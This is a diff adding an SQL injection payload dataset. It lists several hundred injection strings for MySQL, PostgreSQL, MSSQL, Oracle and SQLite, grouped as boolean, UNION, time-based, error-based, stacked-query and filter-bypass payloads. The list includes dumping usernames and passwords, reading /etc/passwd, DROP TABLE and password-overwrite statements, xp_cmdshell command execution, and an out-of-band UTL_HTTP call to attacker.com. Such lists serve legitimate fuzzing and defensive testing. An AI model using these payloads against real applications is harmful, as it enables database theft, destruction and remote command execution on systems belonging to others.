@@ -1,0 +1,412 @@
+# SQL Injection Payloads Dataset
+# Categories: Boolean-based, UNION-based, Time-based, Error-based, Stacked queries, Encoding bypasses
+# Sources: SQLMap, OWASP, PayloadsAllTheThings, Custom
+
+# ==================== BOOLEAN-BASED BLIND ====================
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+" OR "1"="1
+" OR "1"="1"--
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1--
+' OR 'a'='a
+' OR 'x'='x'--
+' OR ''='
+" OR ""="
+' OR 1--
+' OR 1#
+1' OR '1'='1
+1" OR "1"="1
+1' OR 1=1--
+1" OR 1=1--
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin" OR "1"="1
+' OR 'x'='x
+' OR 1=1 OR '1'='1
+1 OR 1=1
+1' OR '1'='1' OR '1'='1
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1#
+' OR '1'='1' LIMIT 1--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 ORDER BY 1#
+'||'1'='1
+' OR 1=1;--
+' OR 1=1;#
+') OR ('1'='1
+') OR ('1'='1'--
+')) OR (('1'='1
+' OR 1=1--+
+' OR 1=1-- -
+' OR 1=1--%00
+' OR 1=1--%20
+' OR 1 #
+'OR'1'='1
+'OR''='
+' oR '1'='1
+' Or '1'='1
+' OR '1'='1' AND '1'='1
+' AND 1=1--
+' AND 1=1#
+" AND 1=1--
+' AND 'a'='a
+1' AND '1'='1
+1' AND 1=1--
+' AND 1=2--
+' AND 1=1 AND '1'='1
+') AND ('1'='1
+')) AND (('1'='1
+' AND 1=1 ORDER BY 1--
+' AND 1=1 LIMIT 1--
+
+# ==================== UNION-BASED ====================
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4,5,6--
+' UNION SELECT 1,2,3,4,5,6,7--
+' UNION SELECT 1,2,3,4,5,6,7,8--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+" UNION SELECT 1,2,3--
+' UNION ALL SELECT 1--
+' UNION ALL SELECT 1,2--
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT 1,2,3,4--
+' UNION ALL SELECT 1,2,3,4,5--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+1' UNION SELECT 1,2,3--
+1' UNION SELECT 1,2,3,4,5--
+1" UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION SELECT 1,username,password FROM users--
+' UNION SELECT id,username,password FROM users--
+' UNION SELECT id,username,password,email FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT table_name,column_name FROM information_schema.columns--
+' UNION SELECT schema_name,NULL FROM information_schema.schemata--
+' UNION SELECT @@version,NULL--
+' UNION SELECT version(),NULL--
+' UNION SELECT user(),NULL--
+' UNION SELECT database(),NULL--
+' UNION SELECT current_user(),NULL--
+' UNION SELECT @@datadir,NULL--
+') UNION SELECT 1,2,3--
+')) UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3 FROM dual--
+' UNION SELECT * FROM users--
+' UNION SELECT * FROM admin--
+' UNION SELECT * FROM accounts--
+0' UNION SELECT 1,2,3--
+-1' UNION SELECT 1,2,3--
+99999' UNION SELECT 1,2,3--
+' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,concat(username,':',password) FROM users--
+' UNION SELECT 1,concat_ws(':',username,password) FROM users--
+' UNION SELECT 1,2,3,4,5 INTO OUTFILE '/tmp/test.txt'--
+' UNION SELECT 1,load_file('/etc/passwd'),3--
+
+# ==================== TIME-BASED BLIND ====================
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+" AND SLEEP(5)--
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+1' AND SLEEP(5)--
+1' AND SLEEP(5)#
+' AND SLEEP(5) AND '1'='1
+'; WAITFOR DELAY '0:0:5'--
+"; WAITFOR DELAY '0:0:5'--
+'); WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '00:00:05'--
+' AND BENCHMARK(10000000,MD5('test'))--
+' AND BENCHMARK(10000000,SHA1('test'))--
+" AND BENCHMARK(10000000,MD5('test'))--
+' OR BENCHMARK(10000000,MD5('test'))--
+1' AND BENCHMARK(5000000,MD5('test'))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT SLEEP(5))--
+' OR (SELECT SLEEP(5))--
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=1,SLEEP(5),0)#
+' OR IF(1=1,SLEEP(5),0)--
+' AND IF(1=2,SLEEP(5),0)--
+' AND (SELECT IF(1=1,SLEEP(5),0))--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))test)--
+' AND pg_sleep(5)--
+" AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+' OR pg_sleep(5)--
+1' AND pg_sleep(5)--
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'; SELECT DBMS_LOCK.SLEEP(5) FROM dual--
+' AND (SELECT COUNT(*) FROM all_users a,all_users b,all_users c)>0--
+
+# ==================== ERROR-BASED ====================
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CONVERT(int,(SELECT user))--
+' AND 1=CONVERT(int,(SELECT db_name()))--
+" AND 1=CONVERT(int,(SELECT @@version))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
+" AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXP(~(SELECT * FROM(SELECT user())a))--
+' AND EXP(~(SELECT * FROM(SELECT @@version)a))--
+' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version)),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,@@version)) USING utf8)))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--
+
+# ==================== STACKED QUERIES ====================
+'; SELECT 1--
+'; SELECT 1,2--
+'; SELECT 1,2,3--
+'; DROP TABLE users--
+'; DROP TABLE users;--
+'; DROP DATABASE test--
+"; DROP TABLE users--
+'; DELETE FROM users--
+'; DELETE FROM users WHERE 1=1--
+'; TRUNCATE TABLE users--
+'; INSERT INTO users VALUES(1,'hacker','password')--
+'; INSERT INTO users(username,password) VALUES('hacker','pass')--
+'; UPDATE users SET password='hacked'--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; UPDATE users SET role='admin' WHERE username='test'--
+1; DROP TABLE users--
+1; SELECT * FROM users--
+1'; DROP TABLE users--
+'; CREATE TABLE hacked(data TEXT)--
+'; ALTER TABLE users ADD COLUMN hacked TEXT--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC xp_cmdshell('dir')--
+'; EXEC master..xp_cmdshell 'whoami'--
+'; EXEC sp_executesql N'SELECT 1'--
+'; SELECT * INTO OUTFILE '/tmp/data.txt' FROM users--
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE test--
+
+# ==================== COMMENT INJECTION ====================
+'/**/OR/**/1=1--
+'/**/UNION/**/SELECT/**/1,2,3--
+'/**/AND/**/1=1--
+'/**/OR/**/1=1/**/--
+/*!50000SELECT*/ 1,2,3--
+/*!UNION*/ /*!SELECT*/ 1,2,3--
+'/*!50000OR*/ 1=1--
+'+/*!50000UNION*/+/*!50000SELECT*/+1,2,3--
+'/*! OR */ 1=1--
+'/* comment */OR/* comment */1=1--
+' OR 1=1--/*
+' UNION/**/SELECT/**/1,2,3--
+'/**/UNION/**/ALL/**/SELECT/**/1,2,3--
+' OR '1'/*comment*/'='1
+' UNION SELECT 1,2,3/*
+' UNION SELECT 1,2,3#
+' OR/**/'1'='1
+'/**/OR/**/'1'='1
+' UNION/*comment*/SELECT 1,2,3--
+'/**/UNION/**/SELECT/**/NULL,NULL--
+' OR/*!50000 1=1*/--
+
+# ==================== ENCODING BYPASSES ====================
+%27%20OR%20%271%27%3D%271
+%27%20OR%201%3D1--
+%27%20UNION%20SELECT%201%2C2%2C3--
+%27%20AND%201%3D1--
+%2527%20OR%20%25271%2527%253D%25271
+%252527%20OR%201%253D1--
+%27%20OR%20%27%78%27%3D%27%78
+%27%20UNION%20SELECT%20%2A%20FROM%20users--
+%27%20AND%20SLEEP%285%29--
+%27%20OR%20BENCHMARK%2810000000%2CMD5%28%27test%27%29%29--
+%2B%27%20OR%20%271%27%3D%271
+0x27204f5220273127273d2731
+0x2720554e494f4e2053454c45435420312c322c332d2d
+CHAR(39)+OR+CHAR(39)+CHAR(49)+CHAR(39)=CHAR(39)+CHAR(49)
+' OR CHAR(49)=CHAR(49)--
+CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(39),CHAR(49),CHAR(39),CHAR(61),CHAR(39),CHAR(49))
+%c0%a7%20OR%201=1--
+%c0%27%20OR%201=1--
+%ef%bc%87%20OR%201=1--
+%u0027%20OR%201=1--
+%u02b9%20OR%201=1--
+' OR 1=1--
+' OR 1=1--
+%00' OR 1=1--
+'%00 OR 1=1--
+' OR '1%00'='1
+'+OR+'1'='1
+'-OR-'1'='1
+
+# ==================== CASE VARIATION ====================
+' oR '1'='1
+' Or '1'='1
+' OR '1'='1
+' or '1'='1
+' OR '1'='1
+' UnIoN SeLeCt 1,2,3--
+' uNiOn sElEcT 1,2,3--
+' UNION select 1,2,3--
+' union SELECT 1,2,3--
+' UnIoN AlL SeLeCt 1,2,3--
+' aNd 1=1--
+' AnD 1=1--
+' AND SlEeP(5)--
+' and SLEEP(5)--
+' Or SlEeP(5)--
+
+# ==================== WHITESPACE BYPASS ====================
+'%09OR%091=1--
+'%0AOR%0A1=1--
+'%0COR%0C1=1--
+'%0DOR%0D1=1--
+'%0BOR%0B1=1--
+'%A0OR%A01=1--
+'	OR	1=1--
+'
+OR
+1=1--
+' OR 1=1--
+'+OR+1=1--
+'(OR(1=1))--
+' OR(1=1)--
+'OR(1)=(1)--
+' UNION(SELECT(1),(2),(3))--
+' AND(1=1)--
+
+# ==================== NO SPACE BYPASS ====================
+'OR'1'='1
+'AND'1'='1
+'UNION'SELECT'1','2','3
+(1)OR(1)=(1)
+'OR(1)=(1)--
+'AND(1)=(1)--
+'UNION(SELECT(1),2,3)--
+
+# ==================== ADVANCED PAYLOADS ====================
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' AND ORD(MID((SELECT password FROM users WHERE username='admin'),1,1))>97--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%')=1--
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>3--
+' AND EXISTS(SELECT * FROM users WHERE username='admin')--
+' AND (SELECT TOP 1 username FROM users)='admin'--
+' AND (SELECT username FROM users WHERE id=1)='admin'--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 10--
+' ORDER BY 100--
+' ORDER BY 1,2--
+' ORDER BY 1,2,3--
+' GROUP BY 1--
+' GROUP BY 1,2--
+' HAVING 1=1--
+' HAVING 1=1--
+' PROCEDURE ANALYSE()--
+' INTO OUTFILE '/tmp/test.txt'--
+' INTO DUMPFILE '/tmp/test.txt'--
+'; SHOW TABLES--
+'; SHOW DATABASES--
+'; SHOW COLUMNS FROM users--
+'; DESC users--
+' RLIKE '.*'--
+' REGEXP '.*'--
+' LIKE '%'--
+
+# ==================== DATABASE SPECIFIC ====================
+# MySQL
+' AND 1=1 LIMIT 0,1--
+' AND @@version LIKE '5%'--
+' AND MID(@@version,1,1)='5'--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,user(),3--
+' UNION SELECT 1,database(),3--
+' UNION SELECT 1,@@datadir,3--
+' UNION SELECT 1,@@basedir,3--
+
+# PostgreSQL
+' AND 1=1::int--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,current_user,3--
+' UNION SELECT 1,current_database(),3--
+'; SELECT version()--
+' AND 1=cast((SELECT version()) as int)--
+' AND CAST((SELECT version()) AS NUMERIC)>1--
+
+# MSSQL
+' AND 1=1--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,user_name(),3--
+' UNION SELECT 1,db_name(),3--
+'; EXEC xp_cmdshell 'dir'--
+'; EXEC sp_executesql N'SELECT 1'--
+' HAVING 1=1--
+' GROUP BY id HAVING 1=1--
+
+# Oracle
+' AND 1=1--
+' UNION SELECT NULL,banner,NULL FROM v$version--
+' UNION SELECT NULL,user,NULL FROM dual--
+' UNION SELECT NULL,SYS.DATABASE_NAME,NULL FROM dual--
+' AND ROWNUM=1--
+' AND 1=UTL_HTTP.REQUEST('http://attacker.com')--
+
+# SQLite
+' AND 1=1--
+' UNION SELECT 1,sqlite_version(),3--
+' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'--
+' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--
+' AND (SELECT COUNT(*) FROM sqlite_master)>0--
+
+# ==================== FILTER BYPASS TECHNIQUES ====================
+' /*!50000OR*/ 1=1--
+' /*!UNION*/ /*!SELECT*/ 1,2,3--
+' UN/**/ION SE/**/LECT 1,2,3--
+' %55NION %53ELECT 1,2,3--
+' uni%6fn sel%65ct 1,2,3--
+' %2f**%2fOR%2f**%2f1=1--
+';%0ASELECT%0A1--
+' UNION%23%0ASELECT 1,2,3--
+' UNION--%0ASELECT 1,2,3--
+' OR 'a'='a' /*
+' AND 1=0 UNION SELECT 1,2,3--
+' AND 1=2 UNION SELECT 1,2,3--
+-1' UNION SELECT 1,2,3--
+0' UNION SELECT 1,2,3--
+99999' UNION SELECT 1,2,3--
+'=' 
+'LIKE'
+'=0--+
